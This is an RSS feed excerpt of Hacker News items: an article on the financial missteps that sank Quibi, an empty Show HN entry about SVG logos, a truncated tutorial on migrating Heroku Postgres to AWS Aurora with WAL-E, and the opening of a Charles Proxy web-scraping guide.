<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071876">thread link</a>) | @itsjoemic
<br/>
November 12, 2020 | https://www.mosaic.tech/post/financial-factors-that-sank-quibi | <a href="https://web.archive.org/web/*/https://www.mosaic.tech/post/financial-factors-that-sank-quibi">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>NYU Stern School of Business professor <a href="https://www.profgalloway.com/land-of-the-undead">Scott Galloway predicted</a> Quibi would fall apart eight months before it did. Unsurprisingly, that rubbed some Quibi leaders the wrong way. On <a href="https://podcasts.apple.com/us/podcast/doj-google-showdown-rip-quibi-listener-mail-question/id1073226719?i=1000495767700">Vox’s Pivot podcast</a>, Galloway said he “got a call from the CFO of Quibi before it even launched and [she] said, ‘You have to stop dancing on our grave before we’ve even been birthed.’”</p><div><p>Well, six months after launch, Quibi officially died, so Scott Galloway can happily dance on the grave.</p><p>If you’ve (somehow) missed the barrage of Quibi news and commentary, here’s what you need to know. Quibi, named for the “quick bites” of short-form video content it would offer users, was founded by Jeffrey Katzenberg (founder of DreamWorks) in August 2018 and quickly closed a $1 billion round of funding. With grand aspirations to compete in the streaming wars, Quibi raised another $750 million in March 2020 before launching its platform in April 2020. </p><p>And it did not go well. </p></div><figure id="w-node-a3a2b323b892-c03f76fb"><p><img src="https://global-uploads.webflow.com/5f1f57792641fc1abd3f7713/5fabe1daa93149329070f661_quite%20headline%20collection-1-2-2.jpg" loading="lazy" alt=""></p></figure><div><p>Ahead of the platform’s launch, Quibi CFO Ambereen Toubassy <a href="https://variety.com/2020/digital/news/quibi-750-million-funding-investment-mobile-video-1203523586/">told <em>Variety</em></a>: “We concluded a very successful second raise which will provide Quibi with a strong cash runway. This round of $750 million gives us tremendous flexibility and the financial wherewithal to build content and technology that consumers embrace.” </p><p>Launching at the scale necessary to meet Quibi’s lofty goals was always going to take a heroic feat of financial planning. As CFO, Toubassy had to shoulder all of the challenges that come with forecasting and tracking financials at that scale. However, the execution of <a href="https://www.mosaic.tech/post/saas-eats-everything">strategic finance</a> just wasn’t there.</p><p>Executives have been quick to blame the COVID-19 pandemic for the platform’s problems. But if there’s one thing you take away from Quibi’s story, remember that it wasn’t a freak health crisis that sank the company—it was a lack of financial fundamentals. </p></div><h2>Trying to Outrun the Burn Rate</h2><div><p>Even after raising a total of $1.75 billion in funding, Quibi managed to spend money at an unsustainable rate. As Quibi’s CFO noted, the two rounds of funding should have set the company up with a strong cash runway—the kind that could support the platform’s aggressive entry to the streaming wars. But a closer look at the company’s spending shows that an unmanageable burn rate almost completely wiped that <a href="https://www.mosaic.tech/post/startup-success-requires-a-clear-view-of-your-runway">runway</a> out over the platform’s six-month life span.</p><p><a href="https://www.theinformation.com/articles/the-investors-who-face-big-losses-from-the-quibi-collapse">Reports show</a> that after paying outstanding bills, Quibi will be returning $350 million to its shareholders. Without more insight into Quibi’s revenue, it’s tough to estimate a net burn rate. But, at the very least, the company spent $1.4 billion over the course of about 26 months, putting its monthly gross burn rate somewhere between $40 million and $50 million. </p><p>That figure obviously proved unsustainable, but where was all the money going? There were two standout costs eating into Quibi’s runway:</p></div><ul role="list"><li><strong>The $100k-per-minute production problem: </strong>At one point, <a href="https://www.vulture.com/article/what-is-quibi-explained.html">Katzenberg said</a> Quibi’s first-year content budget was $1.1 billion, and that higher-profile, scripted shows would have production budgets of $100,000 per minute. <a href="https://techcrunch.com/2020/01/13/quibi-execs-jeffrey-katzenberg-and-meg-whitman-explain-their-big-vision/">According to TechCrunch</a>, CEO Meg Whitman “proudly contrasted the jaw-dropping sum to the estimated $500 to $5,000 an hour spent by YouTube creators.” The result? A product in limbo between two different target markets. They committed to the “Hollywood-quality content” of a Netflix or an HBO to compete against free-to-watch powerhouses like TikTok and YouTube. The cost of content proved too high.</li><li><strong>A prelaunch </strong>“<strong>hiring rampage”: </strong> Just a year after starting the company, and before ever bringing a product to market, Quibi’s head count was already at a costly 160. Then, in August 2019, people close to Quibi <a href="https://www.businessinsider.com/jeffrey-katzenberg-quibi-has-embarked-on-an-aggressive-hiring-spree-2019-8">told <em>Business Insider</em></a> the company was about to go on a hiring rampage. The company hired expensive talent, like Netflix’s director of acquisition marketing, DC’s entertainment president, Netflix’s head of product creative, and at least 17 Snapchat engineers. Another year later, Quibi’s head count reached at least 260, and the company had to ask senior executives to take a 10% pay cut to avoid layoffs, <a href="https://www.wsj.com/articles/quibi-asks-senior-executives-to-take-10-pay-cut-11591206642">according to the <em>Wall Street Journal</em></a>. </li></ul><p>Other factors impacting Quibi’s burn rate included a 10-year lease on a 49,000-square-foot office in the heart of Hollywood, fees from a legal battle over its app features, and (maybe most importantly) an astronomical marketing budget for a new startup—but that deserves its own section.</p><h2>Creating a CAC Nightmare</h2><div><p>Right as the platform was about to launch, <a href="https://digiday.com/future-of-tv/king-kong-jumping-off-empire-state-building-quibis-400m-marketing-push-spans-tv-person-screenings/">reports said</a> Quibi was planning to spend between $400 million and $500 million on marketing in 2020, with a target of 7.4 million paid subscribers for the first year. In the best-case scenario, that would put <a href="https://www.mosaic.tech/post/customer-acquisition-cost">customer acquisition costs</a> (CAC) at $55-$65, which doesn’t sound too bad compared with <a href="https://stratechery.com/2018/netflix-earnings-netflixs-rising-cac-content-and-marketing/">Stratechery’s 2018 estimate</a> that put Netflix’s CAC at $45-$60. Like the CFO’s plans to use the recent $750 million in funding to stabilize runway, these projections seem acceptable in theory.</p><p>However, postlaunch disappointments complicated Quibi’s CAC. External factors like the pandemic and lukewarm reception for the platform led to a much tighter marketing budget and (at best) <a href="https://www.theinformation.com/articles/katzenberg-strikes-out-on-quibi-sale-efforts-so-far">500,000 paying customers</a> by October 2020. &nbsp;</p><p><a href="https://www.theverge.com/2020/7/8/21318060/quibi-subscriber-count-free-trial-paying-users-conversion-rate">One study</a> found that from launch through the company’s shutdown, Quibi ended up spending only $63 million on ads after launch. Even if you use that figure as Quibi’s entire marketing budget, the most conservative estimate would put its CAC about 2x higher than expected. That’s a problem, but it’s not exactly a nightmare. </p><p>The real CAC nightmare becomes apparent when you factor in the content costs. If you were running strategic finance for Quibi, you couldn’t have a CAC conversation without considering the money spent on the content library. This is a streaming business, which means content isn’t just a product development concern—it’s a tool for customer acquisition. Quibi invested heavily in big-name creators, hoping that it would translate to more paying customers while massively skewing CAC.</p><p>Assume that a conservative 20% of the $1.4 billion Quibi spent in 26 months went to production costs for its initial slate of shows. That’s $280 million to add to the $63 million in ad spend. Calculated against the base of 500,000 paid subscribers, CAC jumps all the way up to a crushing $686. </p><p>When reports came out saying Quibi was <a href="https://www.theverge.com/2020/7/8/21318060/quibi-subscriber-count-free-trial-paying-users-conversion-rate">only able to convert 8% of its free trial</a> users to paid subscribers, it was clear that <a href="https://www.mosaic.tech/post/customer-lifetime-value">customer lifetime value</a> (LTV) was also going to be an issue. And, ultimately, the LTV to CAC ratio was just impossible to fix—especially at Quibi’s scale.</p></div><h2>Committing to Overcapitalization</h2><div><p>Raising $1 billion to open the company may have doomed Quibi from the start. It positioned Katzenberg and Co. to fall victim to overcapitalization. Because the company had so much cash on hand, product-oriented leaders like Katzenberg and other executives felt they could bypass financial fundamentals and spend hundreds of millions of dollars before ever generating revenue or even bringing an MVP to market. This path left the company with massive expectations that were almost impossible to meet.</p><p>This was especially problematic as Quibi tried to prove its model. Here’s how <a href="https://www.vanityfair.com/hollywood/2019/06/quibi-jeffrey-katzenberg-streaming-platform-interview">Katzenberg would explain</a> the strategy early on:</p></div><blockquote>I’m going to continue to believe, and argue, and preach that Quibi is not a substitute or a competitor for television. Our [service] is exclusively about what you do from 7 a.m. to 7 p.m. on your phone. And what you’re doing today, if you’re in our core demographic of 25- to 35-year-olds, is you’re actually watching 60-70 min of YouTube, Facebook, Instagram, and Snapchat. That growth is now a well-established consumer habit that Quibi is sailing into.</blockquote><div><p>One of the biggest consequences of Quibi’s overcapitalization and commitment to blitz the market was that it was almost impossible to act like a true startup when consumers didn’t respond well to the platform. Startups pivot all the time when their initial ideas aren’t working. Quibi couldn’t. As Scott Galloway said on the Pivot podcast, “Great companies start small, validate a concept, almost always pivot to something that’s working. This was, let’s start with $1.5 billion.” </p><p>Raising a massive amount of money (like Quibi did) isn’t inherently a problem. You only start to see the consequences of overcapitalization when all that money leads to poor financial hygiene. And this can happen at any scale. Whether you’ve raised $1 million or $100 million, your financial forecasts have to remain realistic to maintain stability as the business evolves rapidly. </p><p>It didn’t take long for Quibi’s financial forecasts to prove unrealistic. But by spending so much money so quickly, they backed themselves into a corner that limited their options as the platform missed subscriber projections by a wide margin. </p></div><h2>Good Financial Hygiene Prevents Quibi-Sized Disasters</h2><div><p>Raising more than $1 billion in funding isn’t exactly common, so we probably won’t see startups labeled “the next Quibi” anytime soon. But that doesn’t mean you’re immune to the same kinds of problems that sank the streaming platform so quickly. </p><p>Maybe Katzenberg is right, and the pandemic really did limit Quibi’s potential. Maybe everyone on the outside is right, and the product-market fit just wasn’t there. People will argue those points endlessly as Quibi goes down in history as one of the fastest startup failures ever.</p><p>What can’t be argued is the fact that poor financial hygiene was at the very core of Quibi’s problems. By prioritizing a “revolutionary” product vision over strategic financial decision-making, Quibi dug a hole so deep that it had no choice but to shut down. Don’t fall into the same trap.</p><p>Whether you’re well on your way to becoming the next unicorn, or you’ve just raised your seed round, make sure you can run financial forecasts continuously and that you have real-time insight into your key <a href="https://www.mosaic.tech/post/the-7-go-to-market-metrics-you-should-actually-care-about-and-why-you-should-care">go-to-market metrics</a>. When you can answer key financial questions at the pace of your business, you’re able to collaborate with stakeholders more effectively and put …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mosaic.tech/post/financial-factors-that-sank-quibi">https://www.mosaic.tech/post/financial-factors-that-sank-quibi</a></em></p>]]>
            </description>
            <link>https://www.mosaic.tech/post/financial-factors-that-sank-quibi</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071876</guid>
            <pubDate>Thu, 12 Nov 2020 17:05:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A 1000 auto-generated hexagonal SVG logos]]>
            </title>
            <description>
<![CDATA[
Score 167 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25071643">thread link</a>) | @graderjs
<br/>
November 12, 2020 | https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1 | <a href="https://web.archive.org/web/*/https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071643</guid>
            <pubDate>Thu, 12 Nov 2020 16:44:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating Large Heroku Postgres Instances to AWS Aurora Without Downtime]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 39 (<a href="https://news.ycombinator.com/item?id=25071502">thread link</a>) | @sciguymcq
<br/>
November 12, 2020 | https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/ | <a href="https://web.archive.org/web/*/https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>
          
          

          
          
          <h3>Introduction</h3>
<p>In this article I discuss a general process I used recently to migrate a large multi-terabyte Heroku Postgres Database from the Heroku Platform to Amazon Aurora Postgres on a live Heroku based application architecture with near zero downtime and builtin failovers during the process. Not only did this migration save significant costs associated with running a large managed Postgres instance it also resulted in increased scalability and flexibility of parameter turing and other management abilities afforded by AWS RDS.</p>

<h4>Contents</h4>
<ul>
<li><a title="Heroku Architecture and Constraints" href="#heroku-architecture-and-constraints">Heroku Architecture and Constraints</a></li>
<li><a title="The RandoNumba Demo App" href="#rando-numba-demo-app">The RandoNumba Demo App</a></li>
<li><a title="Mimicing the Heroku Postgres Service" href="#mimicing-heroku-postgres">Mimicking the Heroku Postgres Service</a></li>
<li><a title="Restore and Promote EC2 Postgres Log Shipped Replica" href="#log-shipped-replica">Restore and Promote EC2 Postgres Log Shipped Replica</a></li>
<li><a title="Create EC2 Postgres Log Streamed Replica" href="#log-streamed-replica">Create EC2 Postgres Log Streamed Replica</a></li>
<li><a title="Switch App Dyno to Promoted EC2 Postgres" href="#switch-to-log-shipped-replica">Switch App Dyno to Promoted EC2 Postgres</a></li>
<li><a title="Initiate Postgres Logical Replication to Aurora Postgres" href="#initiate-logical-replication-to-aurora">Initiate Postgres Logical Replication to Aurora Postgres</a></li>
<li><a title="Switch App Dyno to Aurora Postgres" href="#switch-to-aurora-postgres">Switch App Dyno to Aurora Postgres</a></li>
</ul>
<h3><a id="heroku-architecture-and-constraints"></a>Heroku Architecture and Constraints</h3>
<p><img src="https://thecodinginterface-images.s3.amazonaws.com/blogposts/heroku-postgres-migration/Heroku-Postgres-Migration.jpg" alt="Heroku Migration Diagram" width="991" height="733"></p>
<p>The Heroku Postgres Migration to AWS Aurora Postgres Architecture and Process Flow diagram above shows, at a high level, the Heroku Postgres Data Layer Architecture for a typical Heroku Premium Level Service with High Availability plus a Read Replica for load balancing Read heavy apps. Then on the right is the migration target goal within the AWS platform boundary annotated with the sequence of steps used to migrate the data to the Aurora Postgres instance.</p>
<p>Before I get into discussing the constraints that I've experienced I would like to put forth an important disclaimer. The Heroku platform is a phenominally innovative service that has paved the way for developing countless extremely useful and profitable apps and services by lowering the barrier to entry for small development teams. Many, if not most, apps will not hit the constraints that I point out below alleviating the need for a migration of their data layer off the platform.</p>
<ul>
<li>Heroku can be costly, perhaps for good reasons, because they alleviate much of the sysops / devops investment and dev time costs of maintaining and scaling services like Postgres</li>
<li>Heroku Postgres locks down the majority of the Postgres parameters that are often necessary to tune for large enterprise level, high throughput, Postgres usage</li>
<li>Heroku Postgres monitoring falls well short of many of the other options, particularly AWS RDS, which becomes very important for large enterprise grade applications</li>
<li>Heroku Postgres does not allow Postgres superuser or Replication User roles so migration options become limited</li>
<li>Postgres pg_dump / pg_restore is not a viable option for large databases of a terabyte and up because of the amount of time it requires to run and thus inherently implies down time or data loss if used as an option for failover or migration which isn't possible for most applications</li>
</ul>

<h3><a id="rando-numba-demo-app"></a>The RandoNumba Demo App</h3>
<p>To faciltate this discussion I've provided a toy app that is deployable to Heroku and built using the Django web framework which simply generates random numbers and scrapes quotes from the web.</p>
<p>1) Clone dj-randonumba-heroku app from my GitHub repo</p>
<pre><code>git clone https://github.com/amcquistan/dj-randonumba-heroku.git
cd dj-randonumba-heroku
</code></pre>
<p>2) Create a Heroku App</p>
<pre><code>heroku create</code></pre>
<p>giving the following output but, note you're output will give a different app name and url</p>
<pre><code>Creating app... done, ⬢ intense-headland-79519
https://intense-headland-79519.herokuapp.com/ | https://git.heroku.com/intense-headland-79519.git</code></pre>
<p>Be sure to update `randonumba.settings.ALLOWED_HOSTS` to include the host that Heroku provides.</p>
<p>3) Push the App Code to Heroku</p>
<pre><code>git push heroku master</code></pre>
<p>4) Attach a free tier Heroku Postgres Add on for Demo Purposes</p>
<pre><code>heroku addons:create heroku-postgresql:hobby-dev -a intense-headland-79519</code></pre>
<p>Use psql to create the hstore Postgres extension this demo app uses</p>
<pre><code>heroku pg:psql -a intense-headland-79519
create extension hstore;
\q</code></pre>
<p>then run migrations</p>
<pre><code>heroku run python manage.py migrate -a intense-headland-79519</code></pre>
<p>5) Register and Play with the App</p>
<p>Open the app in your default browser with the following (replace -a intense-headland-79519 with your app name).</p>
<pre><code>heroku open -a intense-headland-79519</code></pre>
<p>Then register the app and generate some randomness</p>
<p><img src="https://thecodinginterface-images.s3.amazonaws.com/blogposts/heroku-postgres-migration/rando-numba-randomness.png" alt="" width="1838" height="948"></p>

<h3><a id="mimicing-heroku-postgres"></a>Mimicking the Heroku Postgres Service</h3>
<p>In the Real World for this process to work you need to request for the Heroku Data Support team to establish continuous WAL log shipping to an AWS S3 bucket along with a base physical backup using the <a title="WAL-E Python based library" href="https://github.com/wal-e/wal-e" target="_blank" rel="noopener">WAL-E Python based library</a>. Rather than bothering Heroku's Data Support team for this demo and to allow readers to fully reproduce the demo I will simply mimick this step with my own AWS EC2 instance running Postgres 11 and shipping a continuous archive to my own AWS S3 bucket.</p>
<h4>Infrastructure Specs and Services</h4>
<ul>
<li>Amazon Linux 2 AMI</li>
<li>Security Group Allowing port 5432 and SSH access</li>
<li>Separate EBS Volume for Installing the Postgres DB Cluster</li>
<li>S3 Bucket for Pushing Base Physical Backup and WAL</li>
<li>IAM User with Programmatic Access to S3</li>
</ul>
<h4>Procedure for Mimicking Heroku Postgres</h4>
<p>1) Update VPS (Virtual Private Server) and Install Dependencies</p>
<pre><code>sudo yum update -y
sudo amazon-linux-extras install epel -y
sudo amazon-linux-extras install postgresql11 -y
sudo yum install postgresql-server postgresql-contrib python3 lzop pv -y
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
sudo python3 get-pip.py
sudo python3 -m pip install envdir wal-e[aws]</code></pre>
<p>2) Mount Volume and Create File System for Postgres Cluster</p>
<p>Use lsblk to identify the EBS volume to install Postgres Cluster on</p>
<pre><code>$ lsblk
NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
xvda    202:0    0   8G  0 disk
└─xvda1 202:1    0   8G  0 part /
xvdb    202:16   0  16G  0 disk</code></pre>
<p>Format volume as a XFS filesystem.</p>
<pre><code>sudo mkfs -t xfs /dev/xvdb</code></pre>
<p>Create a mount point for the volume and mount it to the new directory.</p>
<pre><code>sudo mkdir /database
sudo mount /dev/xvdb /database</code></pre>
<p>Find the device's block id and make the mount permanent in /etc/fstab</p>
<pre><code>sudo blkid # will give you the block id </code></pre>
<p>example entry in /etc/fstab</p>
<pre><code>UUID=19ee2212-7fa0-4c9a-bcbf-cd7019d50fd6     /database   xfs    defaults,nofail   0   2</code></pre>
<p>Test the mount (no errors is the successful outcome).</p>
<pre><code>sudo mount -a</code></pre>
<p>Update permissions of the /database directory for postgres.</p>
<pre><code>sudo chown -R postgres:postgres /database
sudo chmod -R 700 /database</code></pre>
<p>3) Create envdir Directory for AWS Creds used for WAL-E</p>
<pre><code>sudo mkdir -p /etc/wal-e/env
sudo chown -R ec2-user:ec2-user /etc/wal-e
echo "INSERT-VALUE-HERE" &gt; /etc/wal-e/env/AWS_ACCESS_KEY_ID
echo "REGION-HERE" &gt; /etc/wal-e/env/AWS_REGION
echo "INSERT-VALUE-HERE" &gt; /etc/wal-e/env/AWS_SECRET_ACCESS_KEY
echo "S3-BUCKET-FOLDER-URL-HERE" &gt; /etc/wal-e/env/WALE_S3_PREFIX
sudo chown -R postgres:postgres /etc/wal-e
sudo chmod -R 755 /etc/wal-e/env</code></pre>
<p>4) Initialize Postgres Cluster</p>
<p>Run as postgres user.</p>
<pre><code>pg_ctl init -D /database</code></pre>
<p>5) Modify Postgres Configs</p>
<p>First modify /database/postgresql.conf with the following.</p>
<pre><code>listen_addresses = '*' or your apps specific IP
wal_level = replica
archive_mode = on
archive_command = 'envdir /etc/wal-e/env wal-e wal-push %p'
archive_timeout = 60</code></pre>
<p>Update /database/pg_hba.conf for auth (substiture 0.0.0.0/0 with your APPs IP as necessary).</p>
<pre><code>host    pgdb            pguser          0.0.0.0/0               md5</code></pre>
<p>6) Start and Enable Postgres Service</p>
<p>First create a systemd service file for managing the postgresql service in /etc/systemd/system/postgresql.service</p>
<pre><code>.include /lib/systemd/system/postgresql.service

[Service]
Environment=PGDATA=/database
</code></pre>
<p>Reload systemd, start and enable postgresql service</p>
<pre><code>sudo systemctl daemon-reload
sudo systemctl start postgresql
sudo systemctl status postgresql
sudo systemctl enable postgresql</code></pre>
<p>7) Create App Postgres User and Database</p>
<pre><code>createuser -e -l --pwprompt pguser
createdb -e --owner=pguser pgdb</code></pre>
<p>Make hstore extension</p>
<pre><code>psql -d pgdb
create extension hstore;
\q</code></pre>
<p>8) Detach Heroku Postgres Addon and Switch Connection String to EC2 Instance</p>
<p>Note that this is ran locally not on the Amazon EC2 VPS</p>
<p>List addons to get name of Heroku Postgres</p>
<pre><code>heroku addons</code></pre>
<p>Detach the addon for Heroku Postgres</p>
<pre><code>heroku addons:detach name-of-addon -a name-of-heroku-app</code></pre>
<p>Replace the DATABASE_URL config variable to point to the newly spun up EC2 Postgres instance mimicking Heroku Postgres</p>
<pre><code>heroku config:set DATABASE_URL=postgres://pguser:develop3r@ec2-ip-address:5432/pgdb -a name-of-heroku-app
heroku ps:restart -a name-of-heroku-app</code></pre>
<p>Run migrations.</p>
<pre><code>heroku run python manage.py migrate -a name-of-heroku-app</code></pre>
<p>At this point you'll want to register a new user and generate some more test data to migrate. You could also use pg_dump / pg_restore to transfer any existing data from Heroku Postgres to this new EC2 Postgres instance being used to mimic Heroku Postgres</p>
<p><br>9) Push Base Backup to S3 Using WAL-E</p>
<p>Note that tests next commands are to be ran on the Amazon Linux VPS.</p>
<p>As a personal preference I like to wrap potentially long running commands in shell scripts so I can explicitly echo out when things begin and end then to protect against SSH connections from timing out during potentially long running processes I use nohup with backgrounding.</p>
<p>For this I create the following script</p>
<pre><code>mkdir /var/lib/pgsql/scripts &amp;&amp; cd /var/lib/pgsql/scripts
vi wal-e-push-backup.sh</code></pre>
<p>with contents</p>
<pre><code>#!/bin/bash

echo "starting wal-e backup-push"

envdir /etc/wal-e/env wal-e backup-push /database

echo "wal-e backup-push complete"
</code></pre>
<p>Run it.</p>
<pre><code>nohup ./wal-e-push-backup.sh &amp;</code></pre>
<p>After the push finishes I should be able to verify that the backup has been pushed with the following command.</p>
<pre><code>envdir /etc/wal-e/env wal-e backup-list</code></pre>
<p>At this point I have an EC2 Instance with Postgres installed mimicking Heroku Postgres and continuously shipping backups and WAL to S3.</p>
<h3><a id="log-shipped-replica"></a>Restore and Promote EC2 Postgres Log Shipped Replica</h3>
<p>In the real world this is where you will start, that is by creating your log shipped replica loaded from data in S3 in the form of a physical base backup and WAL files. The Heroku Data Support team will likely provide you with S3 creds for WAL-E in the form of Heroku config variables which you can …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/">https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/</a></em></p>]]>
            </description>
            <link>https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071502</guid>
            <pubDate>Thu, 12 Nov 2020 16:27:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Charles Proxy for Web Scraping]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25070934">thread link</a>) | @daolf
<br/>
November 12, 2020 | https://www.scrapingbee.com/blog/charles-proxy/ | <a href="https://web.archive.org/web/*/https://www.scrapingbee.com/blog/charles-proxy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><img src="https://d33wubrfki0l68.cloudfront.net/0c341714fac1e681a51f25db8d80853d341830a9/c3aea/images/authors/kevin.png" alt="Kevin Sahin">
            
            <span>
                
                
                
                <span>
                    <small> ● </small>
                    
                    
                    <span>12 November, 2020</span>
                    
                    <small> ● </small>
                    <span> 10 min read </span>
                </span>
                <p> Kevin has been working in the web scraping industry for 10 years before co-founding <a href="https://www.scrapingbee.com/">ScrapingBee</a>. He is also the author of the Java Web Scraping Handbook.
                        
                        <a href="https://twitter.com/SahinKevin" target="_blank">
                        <svg style="height: 14px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                            <path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z" fill="currentColor"></path>
                        </svg>
                        </a>
                        
                        
                    </p>
            </span>
        </p><div property="articleBody">
          





















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/27c691c6188c7fe4eb579cde7c5f824aa683c60e/4794a/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_825x0_resize_q75_catmullrom.jpg 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/3fb096be65ede7086722d0f0a7a0f128c07b6a22/74124/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_1200x0_resize_q75_catmullrom.jpg 1200w
      
      " src="https://d33wubrfki0l68.cloudfront.net/4163ae1ee1b2e68f8dcbed8300bf0932a70ec915/10de1/blog/charles-proxy/charles_proxy_header.jpg" width="1200" height="628" alt="Charles proxy for web scraping" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/27c691c6188c7fe4eb579cde7c5f824aa683c60e/4794a/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_825x0_resize_q75_catmullrom.jpg 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/3fb096be65ede7086722d0f0a7a0f128c07b6a22/74124/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_1200x0_resize_q75_catmullrom.jpg 1200w
    
    " data-src="https://d33wubrfki0l68.cloudfront.net/4163ae1ee1b2e68f8dcbed8300bf0932a70ec915/10de1/blog/charles-proxy/charles_proxy_header.jpg">
  
</p></div>




<p>Charles proxy is an HTTP debugging proxy that can inspect network calls and debug SSL traffic. With Charles, you are able to inspect requests/responses, headers and cookies. Today we will see how to set up Charles, and how we can use Charles proxy for web scraping. We will focus on extracting data from Javascript-heavy web pages and mobile applications. Charles sits between your applications and the internet:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/96cee26a1c13dff5a76f17f5c760c70b4e267a67/71117/blog/charles-proxy/charles_drawing.png" width="759" height="419" alt="Charles proxy drawing" data-src="https://d33wubrfki0l68.cloudfront.net/96cee26a1c13dff5a76f17f5c760c70b4e267a67/71117/blog/charles-proxy/charles_drawing.png">
  
</p></div>




<p>Charles is like the Chrome dev tools on steroids. It has many incredible features:</p>
<ul>
<li>Bandwidth throttling to emulate slow internet connection</li>
<li>Request editing (the test the behavior of a back-end API for example)</li>
<li>Repeat requests</li>
<li>Full-text search on a list of request (very interesting for web-scraping)</li>
<li>Many more</li>
</ul>
<p>Charles is a very interesting tool when debugging Single Page application or mobile applications.</p>
<h2 id="installation-and-setup">Installation and set-up</h2>
<p>We are going to see how to install and configure Charles on macOS, but there is also a Windows and Linux version.</p>
<p>First visit <a href="https://www.charlesproxy.com/download/">https://www.charlesproxy.com/download/</a> and download Charles.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/c942420600c60ee1d70fa6c522f77134fd378055/6c20f/blog/charles-proxy/charles_install.png" width="758" height="568" alt="Charles Installation Screen" data-src="https://d33wubrfki0l68.cloudfront.net/c942420600c60ee1d70fa6c522f77134fd378055/6c20f/blog/charles-proxy/charles_install.png">
  
</p></div>

<figcaption>
    <small> <em> Network tab of your browser developer console </em> </small>
</figcaption>


<p>After installing Charles, you need to install its root certificate. This will allow Charles to intercept and decrypt the SSL traffic.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/b858dc5ff02dbfcf22c15af6f28c903834ca56a2/17b6c/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/0d05c8b0e8cf7c75e6f3103ab7f7d8c0e7b2801a/380e5/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/1b097620236e124bfea452b202612c875279950c/7af21/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/7557901e88720e280d75eb07f7881f37df6a17cc/a65ba/blog/charles-proxy/root-certificate.png" width="1907" height="989" alt="Charles Root certificate" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/b858dc5ff02dbfcf22c15af6f28c903834ca56a2/17b6c/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/0d05c8b0e8cf7c75e6f3103ab7f7d8c0e7b2801a/380e5/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/1b097620236e124bfea452b202612c875279950c/7af21/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1500x0_resize_catmullrom_2.png 1500w 
